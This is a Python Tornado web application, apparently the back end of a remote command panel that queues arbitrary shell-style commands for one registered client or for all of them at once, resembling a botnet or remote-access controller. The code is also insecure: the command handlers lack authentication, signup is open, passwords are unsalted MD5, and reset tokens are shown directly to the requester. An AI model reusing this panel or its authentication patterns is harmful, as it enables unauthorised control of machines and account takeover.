#-*- coding:utf-8 -*-

import tornado.web
import Utility
import secrets
import random
import string

class BaseHandler(tornado.web.RequestHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

class RootHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self):
        clients = Utility.DB.selectQuery("SELECT ID FROM CLIENTS")
        self.render(tornado.options.options.html + "/index.html",clients=clients)

class LoginHandler(BaseHandler):
    @tornado.gen.coroutine
    def get(self):
        # :todo: Sistema di blocco bruteforce
        self.render(tornado.options.options.html + "/login.html")
    
    @tornado.gen.coroutine
    def post(self):
        # :todo: Sistema di blocco bruteforce

        username = tornado.escape.xhtml_escape(self.get_argument("username"))
        password = Utility.MD5(tornado.escape.xhtml_escape(self.get_argument("password")))

        db_data = Utility.DB.selectQuery("SELECT PASSWORD FROM ADMIN WHERE USERNAME=?",[username])
        
        if db_data:
            # Utente trovato
            if db_data[0] == password:
                # La password coincide ed è valida
                self.set_secure_cookie("user",username)
                self.redirect(self.reverse_url("RootHandler"))
            else:
                self.write("Password errata")
        else:
            # Utente non trovato
            self.write("Utente non trovato")

class LogoutHandler(BaseHandler):
    def get(self):
        self.clear_cookie("user")
        self.redirect(self.reverse_url("RootHandler"))

class SignupHandler(BaseHandler):
    def get(self):
        self.render(tornado.options.options.html + "/signup.html")
    
    def post(self):
        username = tornado.escape.xhtml_escape(self.get_argument("username"))
        password = Utility.MD5(tornado.escape.xhtml_escape(self.get_argument("password")))
        email = tornado.escape.xhtml_escape(self.get_argument("email"))

        exists = Utility.DB.selectQuery("SELECT * FROM ADMIN WHERE USERNAME=?",[username])
        if not exists:
            if(Utility.DB.executeQuery("INSERT INTO ADMIN(USERNAME,PASSWORD,EMAIL) VALUES(?,?,?)",[username,password,email])):
                self.redirect(self.reverse_url("LoginHandler"))
            else:
                self.write("An error occured during database writing process. Try again.")
        else:
            self.write("There is another user with this username. Please take a different username")

class RecoverHandler(BaseHandler):
    def get(self):
        self.render(tornado.options.options.html + "/recoverPassword.html")
    
    def post(self):
        # Richiesta di invio del Token
        username = tornado.escape.xhtml_escape(self.get_argument("username"))
        exists = Utility.DB.selectQuery("SELECT * FROM ADMIN WHERE USERNAME=?",[username])
        if exists:
            # :todo: Mando una email con la password
            token = secrets.token_urlsafe(32)
            Utility.DB.executeQuery("UPDATE ADMIN SET TOKEN=? WHERE USERNAME=?",[token,username])
            self.write("Your recovery link is <a href=\"/token?username={}&token={}\">this</a>".format(username,token))
        else:
            self.write("There is not any user with this name.")

class TokenHandler(BaseHandler):
    def get(self):
        # Tentativo di recupero con un Token
        username = tornado.escape.xhtml_escape(self.get_argument("username"))
        current_token = tornado.escape.xhtml_escape(self.get_argument("token"))
        db_token = Utility.DB.selectQuery("SELECT TOKEN FROM ADMIN WHERE USERNAME=?",[username])
        if db_token:
            if db_token[0] == current_token:
                # Token valido
                new_password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
                md5_password = Utility.MD5(new_password)
                Utility.DB.executeQuery("UPDATE ADMIN SET PASSWORD=?, TOKEN=NULL WHERE USERNAME=?",[md5_password,username])
                self.write("Your new password is: {}".format(new_password))
            else:
                # Token invalido
                self.write("Sorry, invalid token.")
        else:
            self.write("Can't find any valid token. Do the passoword recovery request again")

class ClientHandler(BaseHandler):
    def get(self):
        client_id = self.request.uri[8:]
        client_data = Utility.DB.selectQuery("SELECT * FROM CLIENTS WHERE ID=?",[client_id])
        print(client_data)
        self.render(tornado.options.options.html + "/client.html",data = client_data)
    
    def post(self):
        client_id = self.request.uri[8:]
        command = self.get_body_argument("command")
        command_id = secrets.token_urlsafe()
        Utility.DB.executeQuery("INSERT INTO QUEUE('COMMAND_ID','CLIENT_ID','COMMAND') VALUES(?,?,?)",[command_id,client_id,command])
        self.write("Command added to queue. Click here to <a href=/client/{}>return</a>".format(client_id))
    
class MassiveHandler(BaseHandler):
    def get(self):
        self.render(tornado.options.options.html + "/massive.html")
    
    def post(self):
        command = self.get_body_argument("command")
        clients = Utility.DB.selectQuery("SELECT ID FROM CLIENTS")
        for client in clients:
            command_id = secrets.token_urlsafe()
            Utility.DB.executeQuery("INSERT INTO QUEUE('COMMAND_ID','CLIENT_ID','COMMAND') VALUES(?,?,?)",[command_id,client[0],command])
        self.write("Done, commands in queue")

# APIs
class SysinfoHandler(BaseHandler):
    def post(self):
        print(self.get_body_argument('command'))